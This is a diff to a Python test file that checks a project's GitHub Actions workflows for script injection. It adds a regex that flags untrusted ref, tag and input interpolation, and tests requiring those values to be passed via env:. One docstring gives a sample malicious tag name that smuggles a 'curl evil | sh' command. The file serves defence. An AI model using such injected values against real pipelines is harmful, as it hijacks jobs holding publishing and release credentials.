@@ -13,19 +13,35 @@ capability and this test keeps their moving parts from drifting:
     created with GITHUB_TOKEN does not cascade-trigger its push trigger — and
     its first build step refuses a dispatch from any ref but main.
 
+It also pins one security property across EVERY workflow: attacker-shaped
+context values (ref and tag names above all) never reach a ``run:`` script
+through ``${{ }}`` interpolation — git permits ``"``, ``;``, ``$`` and
+backticks in a ref name and the ``v*`` tag filter accepts them, so an
+interpolated ref is shell injection inside jobs that hold ``id-token: write``
+and ``contents: write``. They travel by ``env:`` and are referenced quoted.
+
 If the wiring is re-shaped, update both workflows and this test together.
 """
 
 from __future__ import annotations
 
+import re
 from pathlib import Path
 from typing import Any
 
 import yaml
 
 REPO_ROOT = Path(__file__).resolve().parents[2]
-WINDOWS_YML = REPO_ROOT / ".github" / "workflows" / "windows-package.yml"
-RELEASE_YML = REPO_ROOT / ".github" / "workflows" / "release.yml"
+WORKFLOW_DIR = REPO_ROOT / ".github" / "workflows"
+WINDOWS_YML = WORKFLOW_DIR / "windows-package.yml"
+RELEASE_YML = WORKFLOW_DIR / "release.yml"
+
+#: Context values an outside contributor can shape (a branch or tag name, an
+#: issue/PR title or body). Interpolating any of these into a shell script is
+#: the GitHub Actions script-injection class.
+_UNTRUSTED_CONTEXT_RE = re.compile(
+    r"\$\{\{[^}]*\b(github\.(ref|ref_name|head_ref|event)\b|inputs\.)[^}]*\}\}"
+)
 
 # PyYAML resolves the bare ``on:`` key to the YAML 1.1 boolean True, not the
 # string "on" — so every workflow's trigger block lives under ``data[_ON]``.
@@ -118,8 +134,16 @@ def test_release_yml_asserts_tag_matches_built_version_before_building() -> None
     guard = _step_index(steps, "tag names the version")
     build = _step_index(steps, "python -m build")
     assert guard < build, "the tag/version assert must run before the build"
-    run = steps[guard]["run"]
-    assert "__version__" in run and "github.ref_name" in run, (
+    step = steps[guard]
+    run = step["run"]
+    # The tag reaches the script through the environment (see
+    # ``test_workflow_run_blocks_never_interpolate_untrusted_context``), so the
+    # guard is `env: REF_NAME: ${{ github.ref_name }}` + a quoted `$REF_NAME`.
+    assert step.get("env", {}).get("REF_NAME") == "${{ github.ref_name }}", (
+        "the guard must take the triggering tag from the environment, not from "
+        f"a `${{{{ }}}}` interpolation; its env is {step.get('env')!r}"
+    )
+    assert "__version__" in run and '"$REF_NAME"' in run, (
         "the guard must derive the version from the package source and compare "
         f"it against the triggering tag; its run block is {run!r}"
     )
@@ -141,3 +165,56 @@ def test_release_yml_asserts_wheel_carries_third_party_licenses() -> None:
     run = steps[check]["run"]
     for needle in ("APACHE-2.0.txt", "OFL-1.1.txt", "THIRD_PARTY_LICENSES.md"):
         assert needle in run, f"the wheel content check must assert {needle}"
+
+
+def _run_blocks(path: Path) -> list[tuple[str, str]]:
+    """Every ``(step label, run script)`` pair in a workflow, jobs included."""
+    data = _load(path)
+    blocks: list[tuple[str, str]] = []
+    jobs = data.get("jobs") or {}
+    for job_name, job in jobs.items():
+        for index, step in enumerate(job.get("steps") or []):
+            script = step.get("run")
+            if isinstance(script, str):
+                label = step.get("name") or f"step {index}"
+                blocks.append((f"{path.name}:{job_name}:{label}", script))
+    return blocks
+
+
+def test_workflow_run_blocks_never_interpolate_untrusted_context() -> None:
+    """No ``run:`` script may interpolate a ref/tag name or a dispatch input.
+
+    ``${{ github.ref_name }}`` inside a script is substituted BEFORE bash sees
+    it, so a tag named ``v1.0"; curl evil | sh; "`` executes inside a job that
+    holds ``id-token: write`` (PyPI Trusted Publishing) or ``contents: write``
+    (the GitHub release upload). The safe form is an ``env:`` entry on the step
+    and a quoted ``"$REF_NAME"`` in the script — bash then treats the value as
+    data, whatever it contains.
+    """
+    offenders: list[str] = []
+    for workflow in sorted(WORKFLOW_DIR.glob("*.yml")):
+        for label, script in _run_blocks(workflow):
+            for hit in _UNTRUSTED_CONTEXT_RE.findall(script):
+                offenders.append(f"{label}: {hit}")
+    assert not offenders, (
+        "these run blocks interpolate attacker-shaped context directly into a "
+        f"shell script; pass them via `env:` and quote the variable: {offenders}"
+    )
+
+
+def test_the_release_guards_take_their_refs_from_the_environment() -> None:
+    """The positive half: the two release guards DO carry the env wiring.
+
+    Without this, deleting the ``env:`` block and the comparison together would
+    keep the negative test above green while removing the guard entirely.
+    """
+    release_steps = _load(RELEASE_YML)["jobs"]["build"]["steps"]
+    release_guard = release_steps[_step_index(release_steps, "tag names the version")]
+    assert release_guard["env"]["REF_NAME"] == "${{ github.ref_name }}"
+    assert '"$REF_NAME"' in release_guard["run"]
+
+    windows_steps = _load(WINDOWS_YML)["jobs"]["release"]["steps"]
+    windows_guard = windows_steps[_step_index(windows_steps, "Assert the release source")]
+    assert windows_guard["env"]["REF"] == "${{ github.ref }}"
+    assert windows_guard["env"]["REF_NAME"] == "${{ github.ref_name }}"
+    assert '"$REF"' in windows_guard["run"] and '"$REF_NAME"' in windows_guard["run"]
